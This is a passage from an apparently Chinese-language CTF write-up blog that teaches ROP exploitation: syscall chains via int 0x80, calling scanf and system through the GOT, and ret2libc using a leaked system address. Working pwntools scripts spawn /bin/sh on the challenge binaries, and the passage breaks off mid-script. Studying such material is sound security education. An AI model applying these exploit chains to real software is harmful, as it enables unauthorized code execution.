class="hljs-string">&quot;AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;</span>)</span><br><span class="line">0020| 0xffffd144 (<span class="hljs-string">&quot;AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;</span>)</span><br><span class="line">0024| 0xffffd148 (<span class="hljs-string">&quot;2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;</span>)</span><br><span class="line">0028| 0xffffd14c (<span class="hljs-string">&quot;AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;</span>)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x41412941 <span class="hljs-keyword">in</span> ?? ()</span><br><span class="line">gdb-peda$ pattern_offset A)AA</span><br><span class="line">A)AA found at offset: 32</span><br></pre></td></tr></table></figure>
+
+<p>随便找了一个<code>sh</code>，地址为<code>0x80BF5C8</code>：</p>
+<p><img src="https://i.loli.net/2018/10/25/5bd1ab13b260b.png"></p>
+<p>到这里就可以愉快的写脚本了：</p>
+<figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#!/usr/bin/python</span></span><br><span class="line"><span class="hljs-comment">#coding : utf-8</span></span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line">io = process(<span class="hljs-string">&quot;./pwn5&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh=<span class="hljs-number">0x080BF5C8</span>         <span class="hljs-comment">#&quot;sh&quot;</span></span><br><span class="line">pop1=<span class="hljs-number">0x08095ff4</span>       <span class="hljs-comment">#pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">pop2=<span class="hljs-number">0x080733b1</span>       <span class="hljs-comment">#pop ecx ; pop ebx ; ret</span></span><br><span class="line">int_80=<span class="hljs-number">0x08071005</span>     <span class="hljs-comment">#int 0x80</span></span><br><span class="line"></span><br><span class="line">payload=<span class="hljs-string">&quot;&quot;</span></span><br><span class="line">payload+=<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">32</span></span><br><span class="line">payload+=p32(pop1)    <span class="hljs-comment">#pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">payload+=p32(<span class="hljs-number">0xb</span>)</span><br><span class="line">payload+=p32(sh)</span><br><span class="line">payload+=p32(<span class="hljs-number">0</span>)</span><br><span class="line">payload+=p32(<span class="hljs-number">0</span>)</span><br><span class="line">payload+=p32(sh)</span><br><span class="line">payload+=p32(pop2)    <span class="hljs-comment">#pop ecx ; pop ebx ; ret</span></span><br><span class="line">payload+=p32(<span class="hljs-number">0</span>)</span><br><span class="line">payload+=p32(sh)</span><br><span class="line">payload += p32(int_80)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="hljs-string">&quot;A&quot;</span>)</span><br><span class="line">io.sendline(<span class="hljs-string">&quot;A&quot;</span>)</span><br><span class="line">io.sendline(<span class="hljs-string">&quot;A&quot;</span>)</span><br><span class="line">io.sendline(<span class="hljs-string">&quot;y&quot;</span>)</span><br><span class="line">io.sendline(<span class="hljs-string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>运行此脚本时发现并不能成功<code>getshell</code>，猜想是<code>sh</code>字符串的问题，于是尝试换一个方法，向程序输入<code>/bin/sh</code>，找到在<code>bss</code>段的存储位置：</p>
+<figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.bss:<span class="hljs-number">080F</span>1A04                                         ; change_major+<span class="hljs-number">33</span>↑o ...</span><br><span class="line">.bss:<span class="hljs-number">080F</span>1A20                 <span class="hljs-keyword">public</span> first_name</span><br><span class="line">.bss:<span class="hljs-number">080F</span>1A20 first_name      db    ? ;               ; DATA XREF: print_beginning+<span class="hljs-number">51</span>↑o</span><br><span class="line">.bss:<span class="hljs-number">080F</span>1A20                                         ; print_beginning+<span class="hljs-number">66</span>↑o ...</span><br><span class="line">.bss:<span class="hljs-number">080F</span>1A21                 db    ? ;</span><br><span class="line">.bss:<span class="hljs-number">080F</span>1A22                 db    ? ;</span><br></pre></td></tr></table></figure>
+
+<p>于是将脚本改为</p>
+<figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#!/usr/bin/python</span></span><br><span class="line"><span class="hljs-comment">#coding : utf-8</span></span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line">io = process(<span class="hljs-string">&quot;./pwn5&quot;</span>)</span><br><span class="line"></span><br><span class="line">bin_sh = <span class="hljs-number">0x080f1a20</span>     <span class="hljs-comment">#&quot;/bin/sh&quot;</span></span><br><span class="line">pop1 = <span class="hljs-number">0x08095ff4</span>       <span class="hljs-comment">#pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">pop2 = <span class="hljs-number">0x080733b1</span>       <span class="hljs-comment">#pop ecx ; pop ebx ; ret</span></span><br><span class="line">int_80 = <span class="hljs-number">0x08071005</span>     <span class="hljs-comment">#int 0x80</span></span><br><span class="line"></span><br><span class="line">payload = <span class="hljs-string">&quot;&quot;</span></span><br><span class="line">payload += <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">32</span></span><br><span class="line">payload += p32(pop1)    <span class="hljs-comment">#pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">payload += p32(<span class="hljs-number">0xb</span>)</span><br><span class="line">payload += p32(bin_sh)</span><br><span class="line">payload += p32(<span class="hljs-number">0</span>)</span><br><span class="line">payload += p32(<span class="hljs-number">0</span>)</span><br><span class="line">payload += p32(bin_sh)</span><br><span class="line">payload += p32(pop2)    <span class="hljs-comment">#pop ecx ; pop ebx ; ret</span></span><br><span class="line">payload += p32(<span class="hljs-number">0</span>)</span><br><span class="line">payload += p32(bin_sh)</span><br><span class="line">payload += p32(int_80)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="hljs-string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">io.sendline(<span class="hljs-string">&quot;A&quot;</span>)</span><br><span class="line">io.sendline(<span class="hljs-string">&quot;A&quot;</span>)</span><br><span class="line">io.sendline(<span class="hljs-string">&quot;y&quot;</span>)</span><br><span class="line">io.sendline(<span class="hljs-string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><code>getshell</code>成功：</p>
+<p><img src="https://i.loli.net/2018/10/25/5bd1b4fd1eaaa.png"></p>
+<p><strong>小结：</strong></p>
+<blockquote>
+<p>调用系统中断来绕过NX的方法总的来说不算难，要能从程序中找到<code>int 0x80</code>并能找到能改变要调用的函数的参数的指令，然后依次传参利用即可🎳</p>
+</blockquote>
+<h2 id="使用Got表中的函数进行ROP"><a href="#使用Got表中的函数进行ROP" class="headerlink" title="使用Got表中的函数进行ROP"></a>使用Got表中的函数进行ROP</h2><p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/12GkumQmMDv-3yayIDfr2Lw">题目下载</a></p>
+<p>这是一道来自<code>RedHat 2017</code>的题目<code>pwn1</code></p>
+<p>使用IDA可以很容易发现此程序的<code>main()</code>函数存在栈溢出，伪C代码如下：</p>
+<figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// [esp+18h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;pwn test&quot;</span>);</span><br><span class="line">  fflush(<span class="hljs-built_in">stdout</span>);</span><br><span class="line">  __isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>程序开启了<code>NX</code>，也就是说我们不能直接把shellcode写到栈中执行，因此向我们找一下获取<code>flag</code>的途径，在IDA中可以看到程序调用了<code>system()</code>函数，另外程序中有<code>scanf()</code>，因此我们可以考虑通过<code>scanf()</code>函数将<code>/bin/sh</code>字符串读取到栈中并通过构造ROP链使得程序执行<code>system(&quot;/bin/sh&quot;)</code>从而<code>get flag</code></p>
+<figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.rodata:08048620 s               db &#x27;pwn test&#x27;,0         ; DATA XREF: main+9↑o</span><br><span class="line">.rodata:<span class="hljs-number">08048629</span> ; <span class="hljs-keyword">char</span> format[]</span><br><span class="line">.rodata:08048629 format          db &#x27;%s&#x27;,0               ; DATA XREF: main+2A↑o</span><br><span class="line">.rodata:<span class="hljs-number">08048629</span>                                         ; main+<span class="hljs-number">3</span>E↑o</span><br><span class="line">.rodata:<span class="hljs-number">08048629</span> _rodata         ends</span><br><span class="line">.rodata:<span class="hljs-number">08048629</span></span><br></pre></td></tr></table></figure>
+
+<p><code>scanf()</code>的参数<code>%s</code>的位置为<code>08048629</code></p>
+<p>程序本身并没有可以用来起shell的字符串，因此我们需要通过scanf把/bin/sh写入到内存页中，但是并不是所有的内存页都能写入，我们可以使用IDA的快捷键ctrl+S查看内存页的情况</p>
+<p><img src="https://i.loli.net/2018/10/29/5bd66176beb5e.png"></p>
+<p>可见在<code>0804A030</code>有一块可读可写且长度足够的空间我们可以把<code>/bin/sh</code>写到这里面</p>
+<p>通过<code>pattern</code>模块可知<code>padding</code>为<code>52</code>，可得脚本如下:</p>
+<figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#!/usr/bin/python</span></span><br><span class="line"><span class="hljs-comment">#coding:utf-8</span></span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="hljs-string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="hljs-string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">scanf_addr=p32(elf.symbols[<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>])</span><br><span class="line">system_addr=p32(elf.symbols[<span class="hljs-string">&#x27;system&#x27;</span>])</span><br><span class="line">baifenhao_s=p32(<span class="hljs-number">0x08048629</span>)</span><br><span class="line">binsh_addr=p32(<span class="hljs-number">0x0804A030</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">52</span>         <span class="hljs-comment">#构造padding</span></span><br><span class="line">payload+=scanf_addr    <span class="hljs-comment">#覆盖EIP的值为scanf的函数地址</span></span><br><span class="line">payload+=baifenhao_s   <span class="hljs-comment">#scanf的第一个参数：%s</span></span><br><span class="line">payload+=binsh_addr    <span class="hljs-comment">#scanf的第二个参数：地址</span></span><br><span class="line">......              </span><br></pre></td></tr></table></figure>
+
+<p>这里出现一些问题如果我们直接像上面那样写脚本的话，在<code>EIP</code>指向<code>scanf()</code>的时候，<code>call __isoc99_scanf</code>之后，<code>ret</code>指令会将call指令压入栈中的地址取出给<code>EIP</code>，但是我们向上面那样构造脚本并没有模拟出<code>call</code>指令的压栈操作，因此我们需要把脚本修改一下，在<code>scanf()</code>的地址和<code>scanf()</code>的参数之间加上一个<code>scanf()</code>调用完成之后的返回地址，由于我们需要调用过<code>scanf()</code>之后再调用<code>system()</code>函数，因此我们可以把这个地址修改为<code>main()</code>函数的地址以便于进行第二次栈溢出执行<code>system()</code>函数，示意图如下</p>
+<figure class="highlight text hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+----------------+                      +----------------+</span><br><span class="line">|   scanf_addr   |                      |   scanf_addr   | </span><br><span class="line">+----------------+                      +----------------+</span><br><span class="line">|   baifenhao_s  |     ========&gt;        |   main_addr    |</span><br><span class="line">+----------------+      修改为：         +----------------+</span><br><span class="line">|   binsh_addr   |                      |   baifenhao_s  | </span><br><span class="line">+----------------+                      +----------------+</span><br><span class="line">                                        |   binsh_addr   | </span><br><span class="line">                                        +----------------+</span><br></pre></td></tr></table></figure>
+
+<p><code>main()</code>函数地址为<code>08048531</code></p>
+<figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="hljs-number">08048531</span> ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:<span class="hljs-number">08048531</span></span><br><span class="line">.text:<span class="hljs-number">08048531</span> ; Attributes: bp-based frame</span><br><span class="line">.text:<span class="hljs-number">08048531</span></span><br><span class="line">.text:<span class="hljs-number">08048531</span> ; <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">char</span> **, <span class="hljs-keyword">char</span> **)</span></span></span><br><span class="line">.text:08048531 main            proc near               ; DATA XREF: start+17↑o</span><br><span class="line">.text:<span class="hljs-number">08048531</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="hljs-number">08048531</span>                 push    ebp</span><br><span class="line">.text:<span class="hljs-number">08048532</span>                 mov     ebp, esp</span><br></pre></td></tr></table></figure>
+
+<p>因此脚本如下：</p>
+<figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#!/usr/bin/python</span></span><br><span class="line"><span class="hljs-comment">#coding:utf-8</span></span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="hljs-string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="hljs-string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">scanf_addr=p32(elf.symbols[<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>])</span><br><span class="line">system_addr=p32(elf.symbols[<span class="hljs-string">&#x27;system&#x27;</span>])</span><br><span class="line">main_addr=p32(<span class="hljs-number">0x08048531</span>)</span><br><span class="line">baifenhao_s=p32(<span class="hljs-number">0x08048629</span>)</span><br><span class="line">binsh_addr=p32(<span class="hljs-number">0x0804A030</span>)</span><br><span class="line"></span><br><span class="line">payload1=<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">52</span>         <span class="hljs-comment">#构造padding</span></span><br><span class="line">payload1+=scanf_addr    <span class="hljs-comment">#覆盖EIP的值为scanf的函数地址</span></span><br><span class="line">payload1+=main_addr     <span class="hljs-comment">#ret到main()</span></span><br><span class="line">payload1+=baifenhao_s   <span class="hljs-comment">#scanf的第一个参数：%s</span></span><br><span class="line">payload1+=binsh_addr    <span class="hljs-comment">#scanf的第二个参数：地址</span></span><br><span class="line"></span><br><span class="line">payload2=<span class="hljs-string">&quot;B&quot;</span>*<span class="hljs-number">44</span>         <span class="hljs-comment">#构造padding,ebp-8，所以padding-8</span></span><br><span class="line">payload2+=system_addr   <span class="hljs-comment">#覆盖EIP的值为system的函数地址</span></span><br><span class="line">payload2+=main_addr     <span class="hljs-comment">#system函数的返回地址，无需考虑，可随意填充</span></span><br><span class="line">payload2+=binsh_addr    <span class="hljs-comment">#binsh字符串的地址充当system()函数的参数</span></span><br><span class="line">                </span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.sendline(<span class="hljs-string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()              </span><br></pre></td></tr></table></figure>
+
+<p>效果：</p>
+<p><img src="https://i.loli.net/2018/10/29/5bd671a95392d.png"></p>
+<h2 id="ROP之ret2libc"><a href="#ROP之ret2libc" class="headerlink" title="ROP之ret2libc"></a>ROP之ret2libc</h2><p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1eKszh72gVUGK3IQeS9uzRg">题目下载</a></p>
+<p>有时候题目所给的程序中并没有可以直接拿来用的函数地址或者字符串，但是给了<code>libc</code>文件，这个文件中包含我们能用到的函数，因此我们可以通过计算相应的函数地址在<code>libc</code>中的偏移量来计算出<code>libc</code>映射到程序中的起始地址，进而利用<code>libc</code>中的其他函数</p>
+<p>在<code>Security Fest CTF 2016</code>的<code>tvstation</code>中，主要逻辑如下</p>
+<figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> __noreturn <span class="hljs-title">menu</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> v0; <span class="hljs-comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      print_menu();</span><br><span class="line">      v0 = (<span class="hljs-keyword">char</span>)get_one();</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v0 != <span class="hljs-number">50</span> )</span><br><span class="line">        <span class="hljs-keyword">break</span>;</span><br><span class="line">      user();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v0 &gt; <span class="hljs-number">50</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v0 == <span class="hljs-number">51</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Disconnected!&quot;</span>);</span><br><span class="line">        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v0 == <span class="hljs-number">52</span> )</span><br><span class="line">        debug();</span><br><span class="line">      <span class="hljs-keyword">else</span></span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid option!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v0 != <span class="hljs-number">49</span> )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_13;</span><br><span class="line">      uptime();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里面有一个<code>debug()</code>函数：</p>
+<figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">__int64 <span class="hljs-title">debug</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">  <span class="hljs-keyword">void</span> *v0; <span class="hljs-comment">// ST08_8</span></span><br><span class="line">  <span class="hljs-keyword">size_t</span> v1; <span class="hljs-comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n=== TV Station - Debug Menu ===&quot;</span>);</span><br><span class="line">  v0 = dlsym((<span class="hljs-keyword">void</span> *)<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>LL, <span class="hljs-string">&quot;system&quot;</span>);</span><br><span class="line">  <span class="hljs-built_in">sprintf</span>(fmsg, info, v0);</span><br><span class="line">  v1 = <span class="hljs-built_in">strlen</span>(fmsg);</span><br><span class="line">  write(<span class="hljs-number">1</span>, fmsg, v1);</span><br><span class="line">  <span class="hljs-keyword">return</span> debug_func(<span class="hljs-number">1L</span>L, fmsg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此函数会直接泄露<code>system()</code>在此程序中加载的位置</p>
+<p><code>system()</code>在<code>libc</code>的偏移量为<code>00000000000456A0</code>:</p>
+<figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="hljs-number">00000000000456</span>A0 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:<span class="hljs-number">00000000000456</span>A0</span><br><span class="line">.text:<span class="hljs-number">00000000000456</span>A0</span><br><span class="line">.text:<span class="hljs-number">00000000000456</span>A0                 <span class="hljs-keyword">public</span> system ; weak</span><br><span class="line">.text:<span class="hljs-number">00000000000456</span>A0 system          proc near               ; DATA XREF: LOAD:<span class="hljs-number">0000000000007438</span>↑o</span><br><span class="line">.text:<span class="hljs-number">00000000000456</span>A0                                         ; LOAD:<span class="hljs-number">000000000000B</span>C68↑o</span><br><span class="line">.text:<span class="hljs-number">00000000000456</span>A0 ; __unwind &#123;</span><br><span class="line">.text:<span class="hljs-number">00000000000456</span>A0                 test    rdi, rdi</span><br><span class="line">.text:<span class="hljs-number">00000000000456</span>A3                 jz      <span class="hljs-keyword">short</span> loc_456B0</span><br><span class="line">.text:<span class="hljs-number">00000000000456</span>A5                 jmp     sub_45130</span><br></pre></td></tr></table></figure>
+
+<p><code>/bin/sh</code>的偏移地址<code>000000000018AC40</code>:</p>
+<figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.rodata:000000000018AC40 aBinSh          db &#x27;/bin/sh&#x27;,0          ; DATA XREF: sub_45130+451↑o</span><br><span class="line">.rodata:<span class="hljs-number">000000000018</span>AC40                                         ; _IO_proc_open+<span class="hljs-number">2F</span>9↑o ...</span><br></pre></td></tr></table></figure>
+
+<p>有了<code>system()</code>和<code>/bin/sh</code>的偏移地址后我们需要一个<code>gadget</code>来给<code>system()</code>传参：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">⚡ root@kali ROPgadget --binary tvstation | grep <span class="hljs-string">&quot;pop rdi&quot;</span></span><br><span class="line">0x0000000000400c13 : pop rdi ; ret</span><br></pre></td></tr></table></figure>
+
+<p>因此可以构造脚本如下：</p>
+<figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#!/usr/bin/python</span></span><br><span class="line"><span class="hljs-comment">#coding:&quot;utf-8&quot;</span></span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=process(<span class="hljs-string">&#x27;./tvstation&#x27;</span>)</span><br><span class="line"><span class="hljs-comment">#elf=ELF(&#x27;./libc.so.6_x64&#x27;)</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="hljs-string">&quot;: &quot;</span>)</span><br><span class="line">io.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)					<span class="hljs-comment">#跳转到debug()</span></span><br><span class="line">io.recvuntil(<span class="hljs-string">&quot;@0x&quot;</span>)</span><br><span class="line">system_addr = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)	<span class="hljs-comment">#读取输出的system函数在内存中的地址</span></span><br><span class="line">libc_start = system_addr - <span class="hljs-number">0x456a0</span>	<span class="hljs-comment">#根据偏移计算libc在内存中的首地址</span></span><br><span class="line">pop_rdi_addr = <span class="hljs-number">0x400c13</span>	<span class="hljs-comment">#pop rdi; ret 在内存中的地址，给system函数传参</span></span><br><span class="line">binsh_addr = libc_start + <span class="hljs-number">0x18AC40</span>	<span class="hljs-comment">#&quot;/bin/sh&quot;字符串在内存中的地址</span></span><br><span class="line"></span><br><span class="line">payload = <span class="hljs-string">&quot;&quot;</span></span><br><span class="line">payload += <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">40</span>					<span class="hljs-comment">#padding</span></span><br><span class="line">payload += p64(pop_rdi_addr)		<span class="hljs-comment">#pop rdi; ret</span></span><br><span 